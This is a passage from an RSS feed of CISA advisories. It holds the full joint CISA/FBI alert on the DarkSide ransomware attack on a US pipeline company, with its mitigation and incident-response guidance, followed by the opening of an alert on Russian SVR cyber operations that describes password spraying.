		&lt;ul&gt;			            &lt;li&gt;May 28, 2021: Initial version&lt;/li&gt;			            &lt;li&gt;May 29, 2021: Added final sentence of first paragraph in Summary section&lt;/li&gt;		&lt;/ul&gt;
		&lt;hr /&gt;
            &lt;div class="field field--name-body field--type-text-with-summary field--label-hidden field--item"&gt;&lt;p class="privacy-and-terms"&gt;This product is provided subject to this &lt;a href="https://us-cert.cisa.gov/privacy/notification"&gt;Notification&lt;/a&gt; and this &lt;a href="https://www.dhs.gov/privacy-policy"&gt;Privacy &amp;amp; Use&lt;/a&gt; policy.&lt;/p&gt;
&lt;/div&gt;
      </description>
  <pubDate>Fri, 28 May 2021 22:29:15 +0000</pubDate>
    <dc:creator>CISA</dc:creator>
    <guid isPermaLink="false">16609 at https://us-cert.cisa.gov</guid>
    </item>
<item>
	<title>AA21-131A: DarkSide Ransomware: Best Practices for Preventing Business Disruption from Ransomware Attacks</title>
	<link>https://us-cert.cisa.gov/ncas/alerts/aa21-131a</link>
	<description>Original release date: May 11, 2021 | Last revised: May 20, 2021&lt;br/&gt;&lt;h3&gt;Summary&lt;/h3&gt;&lt;p class="tip-intro" style="font-size: 15px;"&gt;&lt;em&gt;This Advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&amp;amp;CK®) framework, Version 9. See the &lt;a href="https://attack.mitre.org/versions/v8/techniques/enterprise/"&gt;ATT&amp;amp;CK for Enterprise&lt;/a&gt; for all referenced threat actor tactics and techniques.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The Cybersecurity and Infrastructure&amp;nbsp;Security Agency (CISA) and the Federal Bureau of Investigation (FBI) are aware of a ransomware attack affecting a critical infrastructure (CI) entity—a pipeline company—in the United States. Malicious cyber actors deployed DarkSide ransomware against the pipeline company’s information technology (IT) network.[&lt;a href="https://www.colpipe.com/news/press-releases/media-statement-colonial-pipeline-system-disruption"&gt;1&lt;/a&gt;] At this time, there is no indication that the entity’s operational technology (OT) networks have been directly affected by the ransomware.&lt;/p&gt;

&lt;p&gt;CISA and FBI urge CI asset owners and operators to adopt a heightened state of awareness and implement the recommendations listed in the Mitigations section of this Joint Cybersecurity Advisory, including implementing robust network segmentation between IT and OT networks; regularly testing manual controls; and ensuring that backups are implemented, regularly tested, and isolated from network connections. These mitigations will help CI owners and operators improve their entity's functional resilience by reducing their vulnerability to ransomware and the risk of severe business degradation if impacted by ransomware.&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;&lt;strong&gt;(Updated May 19, 2021):&lt;/strong&gt; &lt;a href="https://us-cert.cisa.gov/sites/default/files/publications/AA21-131A.stix.xml"&gt;Click here for a STIX package of indicators of compromise (IOCs)&lt;/a&gt;. &lt;strong&gt;Note:&lt;/strong&gt; These IOCs were shared with critical infrastructure partners and network defenders on May 10, 2021. The applications listed in the IOCs were leveraged by the threat actors during the course of a compromise. Some of these applications might appear within an organization's enterprise to support legitimate purposes; however, these applications can be used by threat actors to aid in malicious exploitation of an organization's enterprise. CISA and FBI recommend removing any application not deemed necessary for day-to-day operations.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Click &lt;a href="https://us-cert.cisa.gov/sites/default/files/publications/AA21-131A_Darkside_Ransomware.pdf"&gt;here&lt;/a&gt; for a PDF version of this report.&lt;/p&gt;
&lt;h3&gt;Technical Details&lt;/h3&gt;&lt;p&gt;&lt;em&gt;&lt;strong&gt;Note&lt;/strong&gt;: the analysis in this Joint Cybersecurity Advisory is ongoing, and the information provided should not be considered comprehensive. CISA and FBI will update this advisory as new information is available.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;After gaining initial access to the pipeline company’s network, DarkSide actors deployed DarkSide ransomware against the company’s IT network. In response to the cyberattack, the company has reported that they&amp;nbsp;proactively disconnected certain OT systems to ensure the&amp;nbsp;systems’&amp;nbsp;safety.[&lt;a href="https://www.colpipe.com/news/press-releases/media-statement-colonial-pipeline-system-disruption"&gt;2&lt;/a&gt;] At this time, there are no indications that the threat actor moved laterally to OT systems.&lt;/p&gt;

&lt;p&gt;DarkSide is ransomware-as-a-service (RaaS)—the developers of the ransomware receive a share of the proceeds from the cybercriminal actors who deploy it, known as “affiliates.”&amp;nbsp;According to open-source reporting, since August 2020, DarkSide actors have been targeting multiple large, high-revenue organizations, resulting in the encryption and theft of sensitive data. The DarkSide group has publicly stated that they prefer to target organizations that can afford to pay large ransoms instead of hospitals, schools, non-profits, and governments.[&lt;a href="https://securitynews.sonicwall.com/xmlpost/darkside-ransomware-targets-large-corporations-charges-up-to-2m/"&gt;3&lt;/a&gt;],[&lt;a href="https://www.varonis.com/blog/darkside-ransomware/"&gt;4&lt;/a&gt;]&lt;/p&gt;

&lt;p&gt;According to open-source reporting, DarkSide actors have previously been observed gaining initial access through phishing and exploiting remotely accessible accounts and systems and Virtual Desktop Infrastructure (VDI) (&lt;em&gt;Phishing &lt;/em&gt;[&lt;a href="https://attack.mitre.org/versions/v9/techniques/T1566/"&gt;T1566]&lt;/a&gt;, &lt;em&gt;Exploit Public-Facing Application&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v9/techniques/T1190/"&gt;T1190&lt;/a&gt;], &lt;em&gt;External Remote Services&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v9/techniques/T1133/"&gt;T1133&lt;/a&gt;]).[&lt;a href="https://www.bankinfosecurity.com/fbi-darkside-ransomware-used-in-colonial-pipeline-attack-a-16555"&gt;5&lt;/a&gt;],[&lt;a href="https://www.varonis.com/blog/darkside-ransomware/"&gt;6&lt;/a&gt;] DarkSide actors have also been observed using Remote Desktop Protocol (RDP) to maintain &lt;em&gt;Persistence&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v9/tactics/TA0003/"&gt;TA0003&lt;/a&gt;].[&lt;a href="https://www.varonis.com/blog/darkside-ransomware/"&gt;7&lt;/a&gt;]&lt;/p&gt;

&lt;p&gt;After gaining access, DarkSide actors deploy DarkSide ransomware to encrypt and steal sensitive data (&lt;em&gt;Data Encrypted for Impact&lt;/em&gt; [&lt;a href="https://attack.mitre.org/techniques/T1486/"&gt;T1486&lt;/a&gt;]). The actors then threaten to publicly release the data if the ransom is not paid.[&lt;a href="https://securitynews.sonicwall.com/xmlpost/darkside-ransomware-targets-large-corporations-charges-up-to-2m/"&gt;8&lt;/a&gt;],[&lt;a href="https://www.varonis.com/blog/darkside-ransomware/"&gt;9&lt;/a&gt;] The DarkSide ransomware uses Salsa20 and RSA encryption.[&lt;a href="https://www.mcafee.com/enterprise/en-us/threat-center/threat-landscape-dashboard/ransomware-details.darkside-ransomware.html"&gt;10&lt;/a&gt;]&lt;/p&gt;

&lt;p&gt;DarkSide actors primarily use &lt;a href="https://attack.mitre.org/software/S0183/"&gt;The Onion Router (TOR)&lt;/a&gt; for &lt;em&gt;Command and Control (C2)&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v9/tactics/TA0011/"&gt;TA0011&lt;/a&gt;] (&lt;em&gt;Proxy: Multi-hop Proxy&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v9/techniques/T1090/003/"&gt;1090.003&lt;/a&gt;]).[&lt;a href="https://securitynews.sonicwall.com/xmlpost/darkside-ransomware-targets-large-corporations-charges-up-to-2m/"&gt;11&lt;/a&gt;],[&lt;a href="https://www.varonis.com/blog/darkside-ransomware/"&gt;12&lt;/a&gt;] The actors have also been observed using &lt;a href="https://attack.mitre.org/versions/v9/software/S0154/"&gt;Cobalt Strike&lt;/a&gt; for C2.[&lt;a href="https://www.mcafee.com/enterprise/en-us/threat-center/threat-landscape-dashboard/ransomware-details.darkside-ransomware.html"&gt;13&lt;/a&gt;]&lt;/p&gt;
&lt;h3&gt;Mitigations&lt;/h3&gt;&lt;p&gt;CISA and FBI urge CI owners and operators to apply the following mitigations to reduce the risk of compromise by ransomware attacks.&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;&lt;strong&gt;Require multi-factor authentication&lt;/strong&gt; for remote access to OT and IT networks.&lt;/li&gt;
	&lt;li&gt;&lt;strong&gt;Enable strong spam filters to prevent phishing emails from reaching end users&lt;/strong&gt;. Filter emails containing executable files from reaching end users.&lt;/li&gt;
	&lt;li&gt;&lt;strong&gt;Implement a user training program and simulated attacks for spearphishing&lt;/strong&gt; to discourage users from visiting malicious websites or opening malicious attachments and re-enforce the appropriate user responses to spearphishing emails.&lt;/li&gt;
	&lt;li&gt;&lt;strong&gt;Filter network traffic &lt;/strong&gt;to prohibit ingress and egress communications with known malicious IP addresses. Prevent users from accessing malicious websites by implementing URL blocklists and/or allowlists.&lt;/li&gt;
	&lt;li&gt;&lt;strong&gt;Update software&lt;/strong&gt;, including operating systems, applications, and firmware on IT network assets, in a timely manner. Consider using a centralized patch management system; use a risk-based assessment strategy to determine which OT network assets and zones should participate in the patch management program.&lt;/li&gt;
	&lt;li&gt;&lt;strong&gt;Limit access to resources over networks, especially by restricting RDP&lt;/strong&gt;. After assessing risks, if RDP is deemed operationally necessary, restrict the originating sources and require multi-factor authentication.&lt;/li&gt;
	&lt;li&gt;&lt;strong&gt;Set antivirus/antimalware programs to conduct regular scans&lt;/strong&gt; of IT network assets using up-to-date signatures. Use a risk-based asset inventory strategy to determine how OT network assets are identified and evaluated for the presence of malware.&lt;/li&gt;
	&lt;li&gt;&lt;strong&gt;Implement unauthorized execution prevention by&lt;/strong&gt;:&amp;nbsp;
	&lt;ul&gt;
		&lt;li&gt;&lt;strong&gt;Disabling macro scripts from Microsoft Office files&lt;/strong&gt; transmitted via email. Consider using Office Viewer software to open Microsoft Office files transmitted via email instead of full Microsoft Office suite applications.&lt;/li&gt;
		&lt;li&gt;&lt;strong&gt;Implementing application allowlisting&lt;/strong&gt;, which only allows systems to execute programs known and permitted by security policy. Implement software restriction policies (SRPs) or other controls to prevent programs from executing from common ransomware locations, such as temporary folders supporting popular internet browsers or compression/decompression programs, including the &lt;code&gt;AppData/LocalAppData&lt;/code&gt; folder.&lt;/li&gt;
		&lt;li&gt;&lt;strong&gt;Monitor and/or block inbound connections from Tor exit nodes and other anonymization services&lt;/strong&gt; to IP addresses and ports for which external connections are not expected (i.e., other than VPN gateways, mail ports, web ports). For more guidance, refer to Joint Cybersecurity Advisory &lt;a href="https://us-cert.cisa.gov/ncas/alerts/aa20-183a"&gt;AA20-183A: Defending Against Malicious Cyber Activity Originating from Tor&lt;/a&gt;.&lt;/li&gt;
		&lt;li&gt;&lt;strong&gt;Deploy signatures to detect and/or block inbound connection from Cobalt Strike servers&lt;/strong&gt; and other post exploitation tools.&lt;/li&gt;
	&lt;/ul&gt;
	&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;CISA and FBI urge CI owners and operators to apply the following mitigations now to reduce the risk of severe business or functional degradation should their CI entity fall victim to a ransomware attack in the future.&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;&lt;strong&gt;Implement and ensure robust network segmentation between IT and OT networks &lt;/strong&gt;to limit the ability of adversaries to pivot to the OT network even if the IT network is compromised. Define a demilitarized zone that eliminates unregulated communication between the IT and OT networks.&lt;/li&gt;
	&lt;li&gt;&lt;strong&gt;Organize OT assets into logical zones&lt;/strong&gt; by taking into account criticality, consequence, and operational necessity. Define acceptable communication conduits between the zones and deploy security controls to filter network traffic and monitor communications between zones. Prohibit industrial control system (ICS) protocols from traversing the IT network.&lt;/li&gt;
	&lt;li&gt;&lt;strong&gt;Identify OT and IT network inter-dependencies and develop workarounds or manual controls&lt;/strong&gt; to ensure ICS networks can be isolated if the connections create risk to the safe and reliable operation of OT processes. Regularly test contingency plans such as manual controls so that safety critical functions can be maintained during a cyber incident.&amp;nbsp;Ensure that the OT network can operate at necessary capacity even if the IT network is compromised.&amp;nbsp;&lt;/li&gt;
	&lt;li&gt;&lt;strong&gt;Regularly test manual controls&lt;/strong&gt; so that critical functions can be kept running if ICS or OT networks need to be taken offline.&lt;/li&gt;
	&lt;li&gt;&lt;strong&gt;Implement regular data backup procedures&lt;/strong&gt; on both the IT and OT networks. Backup procedures should be conducted on a frequent, regular basis. The data backup procedures should also address the following best practices:
	&lt;ul&gt;
		&lt;li&gt;&lt;strong&gt;Ensure that backups are regularly tested&lt;/strong&gt;.&lt;/li&gt;
		&lt;li&gt;&lt;strong&gt;Store your backups separately&lt;/strong&gt;. Backups should be isolated from network connections that could enable the spread of ransomware. It is important that backups be maintained offline as many ransomware variants attempt to find and encrypt or delete accessible backups. Maintaining current backups offline is critical because if your network data is encrypted with ransomware, your organization can restore systems to its previous state. Best practice is to store your backups on a separate device that cannot be accessed from a network, such as on an external hard drive. (See the Software Engineering Institute’s page on &lt;a href="https://insights.sei.cmu.edu/sei_blog/2017/05/ransomware-best-practices-for-prevention-and-response.html"&gt;ransomware&lt;/a&gt;).&lt;/li&gt;
		&lt;li&gt;&lt;strong&gt;Maintain regularly updated “gold images” of critical systems in the event they need to be rebuilt&lt;/strong&gt;. This entails maintaining image “templates” that include a preconfigured operating system (OS) and associated software applications that can be quickly deployed to rebuild a system, such as a virtual machine or server.&lt;/li&gt;
		&lt;li&gt;&lt;strong&gt;Retain backup hardware&lt;/strong&gt; to rebuild systems in the event rebuilding the primary system is not preferred. Hardware that is newer or older than the primary system can present installation or compatibility hurdles when rebuilding from images.&lt;/li&gt;
		&lt;li&gt;&lt;strong&gt;Store source code or executables&lt;/strong&gt;. It is more efficient to rebuild from system images, but some images will not install on different hardware or platforms correctly; having separate access to needed software will help in these cases.&lt;/li&gt;
	&lt;/ul&gt;
	&lt;/li&gt;
	&lt;li&gt;&lt;strong&gt;Ensure user and process accounts are limited through account use policies, user account control, and privileged account management&lt;/strong&gt;. Organize access rights based on the principles of least privilege and separation of duties.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;If your organization is impacted by a ransomware incident, CISA and FBI recommend the following actions:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;&lt;strong&gt;Isolate the infected system&lt;/strong&gt;. Remove the infected system from all networks, and disable the computer’s wireless, Bluetooth, and any other potential networking capabilities. Ensure all shared and networked drives are disconnected, whether wired or wireless. &amp;nbsp;&lt;/li&gt;
	&lt;li&gt;&lt;strong&gt;Turn off other computers and devices&lt;/strong&gt;. Power-off and segregate (i.e., remove from the network) the infected computer(s). Power-off and segregate any other computers or devices that shared a network with the infected computer(s) that have not been fully encrypted by ransomware. If possible, collect and secure all infected and potentially infected computers and devices in a central location, making sure to clearly label any computers that have been encrypted. Powering-off and segregating infected computers and computers that have not been fully encrypted may allow for the recovery of partially encrypted files by specialists. (See &lt;a href="https://us-cert.cisa.gov/ncas/tips/ST15-003"&gt;Before You Connect a New Computer to the Internet&lt;/a&gt; for tips on how to make a computer more secure before you reconnect it to a network.)&lt;/li&gt;
	&lt;li&gt;&lt;strong&gt;Secure your backups&lt;/strong&gt;. Ensure that your backup data is offline and secure. If possible, scan your backup data with an antivirus program to check that it is free of malware.&lt;/li&gt;
	&lt;li&gt;Refer to Joint Cybersecurity Advisory: &lt;a href="https://us-cert.cisa.gov/ncas/alerts/aa20-245a"&gt;AA20-245A: Technical Approaches to Uncovering and Remediating Malicious Activity&lt;/a&gt; for more best practices on incident response.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Note: &lt;/strong&gt;CISA and the FBI do not encourage paying a ransom to criminal actors. Paying a ransom may embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or may fund illicit activities. Paying the ransom also does not guarantee that a victim’s files will be recovered.&amp;nbsp;CISA and FBI urge you to report ransomware incidents to your &lt;a href="http://www.fbi.gov/contact-us/field"&gt;local FBI field office&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;CISA offers a range of no-cost &lt;a href="https://www.cisa.gov/cyber-hygiene-services"&gt;cyber hygiene services&lt;/a&gt; to help CI organizations assess, identify and reduce their exposure to threats, including ransomware. By requesting these services, organizations of any size could find ways to reduce their risk and mitigate attack vectors.&lt;/p&gt;

&lt;h3&gt;Resources&lt;/h3&gt;

&lt;ul&gt;
	&lt;li&gt;CISA and MS-ISAC: &lt;a href="https://www.cisa.gov/sites/default/files/publications/CISA_MS-ISAC_Ransomware Guide_S508C.pdf"&gt;Joint Ransomware Guide&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;CISA: &lt;a href="https://www.cisa.gov/ransomware"&gt;Ransomware page&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;CISA Tip: &lt;a href="https://us-cert.cisa.gov/ncas/tips/ST19-001"&gt;Protecting Against Ransomware&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;CISA: &lt;a href="https://www.us-cert.gov/sites/default/files/publications/Ransomware_Executive_One-Pager_and_Technical_Document-FINAL.pdf"&gt;CISA Ransomware One-Pager and Technical Document&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;CISA Insights: &lt;a href="https://www.us-cert.gov/sites/default/files/2019-08/CISA_Insights-Ransomware_Outbreak_S508C.pdf"&gt;Ransomware Outbreak&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;CISA: &lt;a href="https://www.cisa.gov/pipeline-cybersecurity-initiative"&gt;Pipeline Cybersecurity Initiative&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;CISA Webinar: &lt;a href="https://www.youtube.com/watch?v=D8kC07tu27A"&gt;Combating Ransomware&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;CISA: &lt;a href="https://www.cisa.gov/publication/cybersecurity-best-practices-for-industrial-control-systems"&gt;Cybersecurity Practices for Industrial Control Systems&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;FBI: &lt;a href="https://www.fbi.gov/news/stories/incidents-of-ransomware-on-the-rise/incidents-of-ransomware-on-the-rise"&gt;Incidents of Ransomware on the Rise&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;National Security Agency (NSA): &lt;a href="https://media.defense.gov/2021/Apr/29/2002630479/-1/-1/1/CSA_STOP-MCA-AGAINST-OT_UOO13672321.PDF"&gt;Stop Malicious Cyber Activity Against Connected Operational Technology&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;Department of Energy: &lt;a href="https://www.energy.gov/sites/prod/files/2014/03/f13/ONG-C2M2-v1-1_cor.pdf"&gt;Oil and Natural Gas Subsector Cybersecurity Capability Maturity Model&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;Transportation Security Agency: &lt;a href="https://www.tsa.gov/sites/default/files/pipeline_security_guidelines.pdf"&gt;Pipeline Security Guidelines&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;National Institute of Standards and Technology (NIST): &lt;a href="https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04162018.pdf"&gt;Framework for Improving Critical Infrastructure Cybersecurity&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;NIST: &lt;a href="https://csrc.nist.gov/projects/ransomware-protection-and-response"&gt;Ransomware Protection and Response&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;NIST: &lt;a href="https://www.nccoe.nist.gov/projects/building-blocks/data-integrity/identify-protect"&gt;Data Integrity: Identifying and Protecting Assets Against Ransomware and Other Destructive Events&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;NIST: &lt;a href="https://www.nccoe.nist.gov/projects/building-blocks/data-integrity/detect-respond"&gt;Data Integrity: Detecting and Responding to Ransomware and Other Destructive Events&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;NIST: &lt;a href="https://www.nccoe.nist.gov/projects/building-blocks/data-integrity/recover"&gt;Data Integrity: Recovering from Ransomware and Other Destructive Events&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;NIST: &lt;a href="https://csrc.nist.gov/publications/detail/sp/800-82/rev-2/final"&gt;Guide to Industrial Control Systems (ICS) Security&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;Software Engineering Institute: Ransomware: &lt;a href="https://insights.sei.cmu.edu/blog/ransomware-best-practices-for-prevention-and-response/"&gt;Best Practices for Prevention and Response&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;NIST &lt;a href="https://csrc.nist.gov/CSRC/media/Projects/ransomware-protection-and-response/documents/NIST_Tips_for_Preparing_for_Ransomware_Attacks.pdf"&gt;Fact Sheet: How Do I Stay Prepared?&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Contact Information&lt;/h3&gt;&lt;p&gt;Victims of ransomware should report it immediately to CISA at &lt;a href="https://us-cert.cisa.gov/report"&gt;https://us-cert.cisa.gov/report&lt;/a&gt;, a &lt;a href="https://www.fbi.gov/contact-us/field-offices"&gt;local FBI Field Office&lt;/a&gt;, or &lt;a href="http://www.secretservice.gov/contact/field-offices/"&gt;U.S. Secret Service Field Office&lt;/a&gt;. To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact your local FBI field office at &lt;a href="http://www.fbi.gov/contact-us/field"&gt;www.fbi.gov/contact-us/field&lt;/a&gt;, or the FBI’s 24/7 Cyber Watch (CyWatch) at&amp;nbsp;(855) 292-3937 or by e-mail at &lt;a href="https://us-cert.cisa.govmailto:CyWatch@fbi.gov"&gt;CyWatch@fbi.gov&lt;/a&gt;. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. To request incident response resources or technical assistance related to these threats, contact CISA at &lt;a href="https://us-cert.cisa.govmailto:CISAServiceDesk@cisa.dhs.gov"&gt;CISAServiceDesk@cisa.dhs.gov&lt;/a&gt;.&lt;/p&gt;
                    &lt;h3&gt;References&lt;/h3&gt;
		        &lt;ul&gt;		            	&lt;li&gt;&lt;a href="https://www.colpipe.com/news/press-releases/media-statement-colonial-pipeline-system-disruption"&gt;[1] Colonial Pipeline Media Statement on Pipeline Disruption&lt;/a&gt;&lt;/li&gt;		            	&lt;li&gt;&lt;a href="https://www.colpipe.com/news/press-releases/media-statement-colonial-pipeline-system-disruption"&gt;[2] Ibid&lt;/a&gt;&lt;/li&gt;		            	&lt;li&gt;&lt;a href="https://securitynews.sonicwall.com/xmlpost/darkside-ransomware-targets-large-corporations-charges-up-to-2m/"&gt;[3] SonicWall: Darkside Ransomware Targets Large Corporations. Charges up to $2M.&lt;/a&gt;&lt;/li&gt;		            	&lt;li&gt;&lt;a href="https://www.varonis.com/blog/darkside-ransomware/"&gt;[4] Varonis: Return of the Darkside: Analysis of a Large-Scale Data Theft Campaign&lt;/a&gt;&lt;/li&gt;		            	&lt;li&gt;&lt;a href="https://www.bankinfosecurity.com/fbi-darkside-ransomware-used-in-colonial-pipeline-attack-a-16555"&gt;[5] BankInfo Security: FBI: DarkSide Ransomware Used in Colonial Pipeline Attack&lt;/a&gt;&lt;/li&gt;		            	&lt;li&gt;&lt;a href="https://www.varonis.com/blog/darkside-ransomware/"&gt;[6] Varonis: Return of the Darkside: Analysis of a Large-Scale Data Theft Campaign&lt;/a&gt;&lt;/li&gt;		            	&lt;li&gt;&lt;a href="https://www.varonis.com/blog/darkside-ransomware/"&gt;[7] Ibid&lt;/a&gt;&lt;/li&gt;		            	&lt;li&gt;&lt;a href="https://securitynews.sonicwall.com/xmlpost/darkside-ransomware-targets-large-corporations-charges-up-to-2m/"&gt;[8] SonicWall: Darkside Ransomware Targets Large Corporations. Charges up to $2M&lt;/a&gt;&lt;/li&gt;		            	&lt;li&gt;&lt;a href="https://www.varonis.com/blog/darkside-ransomware/"&gt;[9] Varonis: Return of the Darkside: Analysis of a Large-Scale Data Theft Campaign&lt;/a&gt;&lt;/li&gt;		            	&lt;li&gt;&lt;a href="https://www.mcafee.com/enterprise/en-us/threat-center/threat-landscape-dashboard/ransomware-details.darkside-ransomware.html"&gt;[10] McAfee: Threat Landscape Dashboard DarkSide – Ransomware&lt;/a&gt;&lt;/li&gt;		            	&lt;li&gt;&lt;a href="https://securitynews.sonicwall.com/xmlpost/darkside-ransomware-targets-large-corporations-charges-up-to-2m/"&gt;[11] SonicWall: Darkside Ransomware Targets Large Corporations. Charges up to $2M&lt;/a&gt;&lt;/li&gt;		            	&lt;li&gt;&lt;a href="https://www.varonis.com/blog/darkside-ransomware/"&gt;[12] Varonis: Return of the Darkside: Analysis of a Large-Scale Data Theft Campaign&lt;/a&gt;&lt;/li&gt;		            	&lt;li&gt;&lt;a href="https://www.mcafee.com/enterprise/en-us/threat-center/threat-landscape-dashboard/ransomware-details.darkside-ransomware.html"&gt;[13] McAfee: Threat Landscape Dashboard DarkSide – Ransomware&lt;/a&gt;&lt;/li&gt;		        &lt;/ul&gt;            &lt;h3&gt;Revisions&lt;/h3&gt;
		&lt;ul&gt;			            &lt;li&gt;May 11, 2021: Initial Version&lt;/li&gt;			            &lt;li&gt;May 12, 2021: Added additional resources&lt;/li&gt;			            &lt;li&gt;May 19, 2021: Added IOCs&lt;/li&gt;		&lt;/ul&gt;
		&lt;hr /&gt;
            &lt;div class="field field--name-body field--type-text-with-summary field--label-hidden field--item"&gt;&lt;p class="privacy-and-terms"&gt;This product is provided subject to this &lt;a href="https://us-cert.cisa.gov/privacy/notification"&gt;Notification&lt;/a&gt; and this &lt;a href="https://www.dhs.gov/privacy-policy"&gt;Privacy &amp;amp; Use&lt;/a&gt; policy.&lt;/p&gt;
&lt;/div&gt;
      </description>
  <pubDate>Tue, 11 May 2021 19:00:00 +0000</pubDate>
    <dc:creator>CISA</dc:creator>
    <guid isPermaLink="false">16551 at https://us-cert.cisa.gov</guid>
    </item>
<item>
	<title>AA21-116A: Russian Foreign Intelligence Service (SVR) Cyber Operations: Trends and Best Practices for Network Defenders</title>
	<link>https://us-cert.cisa.gov/ncas/alerts/aa21-116a</link>
	<description>Original release date: April 26, 2021&lt;br/&gt;&lt;h3&gt;Summary&lt;/h3&gt;&lt;p&gt;The Federal Bureau of Investigation (FBI), Department of Homeland Security (DHS), and Cybersecurity and Infrastructure Security Agency (CISA) assess Russian Foreign Intelligence Service (SVR) cyber actors—also known as Advanced Persistent Threat 29 (APT 29), the Dukes, CozyBear, and Yttrium—will continue to seek intelligence from U.S. and foreign entities through cyber exploitation, using a range of initial exploitation techniques that vary in sophistication, coupled with stealthy intrusion tradecraft within compromised networks. The SVR primarily targets government networks, think tank and policy analysis organizations, and information technology companies. On April 15,&amp;nbsp;2021, the White House released a statement on the recent SolarWinds compromise, attributing the activity to the SVR. For additional detailed information on identified vulnerabilities and mitigations, see the National Security Agency (NSA), Cybersecurity and Infrastructure Security Agency (CISA), and FBI Cybersecurity Advisory titled “Russian SVR Targets U.S. and Allied Networks,” released on April 15,&amp;nbsp;2021.&lt;/p&gt;

&lt;p&gt;The FBI and DHS are providing information on the SVR’s cyber tools, targets, techniques, and capabilities to aid organizations in conducting their own investigations and securing their networks.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://us-cert.cisa.gov/sites/default/files/publications/AA21-116A_Russian_Foreign_Intelligence_Service_Cyber_Operations_508C.pdf"&gt;Click here&lt;/a&gt;&amp;nbsp;for a PDF version of this report.&lt;/p&gt;

&lt;h3&gt;Threat Overview&lt;/h3&gt;

&lt;p&gt;SVR cyber operations have posed a longstanding threat to the United States. Prior to 2018, several private cyber security companies published reports about APT 29 operations to obtain access to victim networks and steal information, highlighting the use of customized tools to maximize stealth inside victim networks and APT 29 actors’ ability to move within victim environments undetected.&lt;/p&gt;

&lt;p&gt;Beginning in 2018, the FBI observed the SVR shift from using malware on victim networks to targeting cloud resources, particularly e-mail, to obtain information. The exploitation of Microsoft Office 365 environments following network access gained through use of modified SolarWinds software reflects this continuing trend. Targeting cloud resources probably reduces the likelihood of detection by using compromised accounts or system misconfigurations to blend in with normal or unmonitored traffic in an environment not well defended, monitored, or understood by victim organizations.&lt;/p&gt;
&lt;h3&gt;Technical Details&lt;/h3&gt;&lt;h3&gt;SVR Cyber Operations Tactics, Techniques, and Procedures&lt;/h3&gt;

&lt;h3&gt;Password Spraying&lt;/h3&gt;

&lt;p&gt;In one 2018 compromise of a large network, SVR cyber actors used password spraying to identify a weak password associated with an administrative account. The actors conducted the password spraying activity in a “low and slow” manner, attempting a small number of passwords at infrequent intervals, possibly to avoid detection. The password spraying used a large number of IP addresses all located in the same country as the victim, including those associated with residential, commercial, mobile, and The Onion Router (TOR) addresses.&lt;/p&gt;

&lt;p&gt;The organization unintentionally exempted the compromised administrator’s account from multi-factor authentication requirements. With access to the administrative account, the actors modified permissions of specific e-mail accounts on the network, allowing any authenticated network user to read those accounts.&lt;/p&gt;

&lt;p&gt;The actors also used the misconfiguration for compromised non-administrative accounts. That misconfiguration enabled logins using legacy single-factor authentication on devices which did not support multi-factor authentication. The FBI suspects this was achieved by spoofing user agent strings to appear to be older versions of mail clients, including Apple’s mail client and old versions of Microsoft Outlook. After logging in as a non-administrative user, the actors used the permission changes applied by the compromised administrative user to access specific mailboxes of interest within the victim organization.&lt;/p&gt;

&lt;p&gt;While the password sprays were conducted from many different IP addresses, once the actors obtained access to an account, that compromised account was generally only accessed from a single IP address corresponding to a leased virtual private server (VPS). The FBI observed minimal overlap between the VPSs used for different compromised accounts, and each leased server used to conduct follow-on actions was in the same country as the victim organization.&lt;/p&gt;

&lt;p&gt;During the period of their access, the actors consistently logged into the administrative account to modify account permissions, including removing their access to accounts presumed to no longer be of interest, or adding permissions to additional accounts.&amp;nbsp;&lt;/p&gt;

&lt;h4&gt;&lt;em&gt;&lt;strong&gt;Recommendations&lt;/strong&gt;&lt;/em&gt;&lt;/h4&gt;

&lt;p&gt;To defend from this technique, the FBI and DHS recommend network operators to follow best practices for configuring access to cloud computing environments, including:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;Mandatory use of an approved multi-factor authentication solution for all users from both on premises and remote locations.&lt;/li&gt;
